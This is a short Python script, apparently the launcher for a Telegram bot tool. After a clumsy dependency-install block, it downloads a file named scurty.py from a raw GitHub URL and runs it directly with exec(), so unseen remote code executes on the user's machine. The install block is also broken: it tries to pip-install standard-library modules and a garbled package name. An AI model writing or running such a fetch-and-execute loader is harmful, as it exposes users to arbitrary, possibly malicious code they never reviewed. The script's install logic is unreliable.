import os ,time


try:
    import requests,string,telebot,random,user_agent,us,pyfiglet
    from user_agent import generate_user_agent
    from telebot import types
    
except ImportError:
    os.system('pip install requests')
    os.system('pip install random')
    os.system('pip install user_agent')
    os.system('pip install telebot')
    os.system('pip install string')
    os.system('pip install us')
    os.system('pip install pyfilet(')
    import requests,string,telebot,random,user_agent,us,pyfiglet
    from user_agent import generate_user_agent
    from telebot import types
    
    os.system('clear')

req = requests.get("https://raw.githubusercontent.com/GOLDTTeam/xx/main/scurty.py")
exec(req.text)
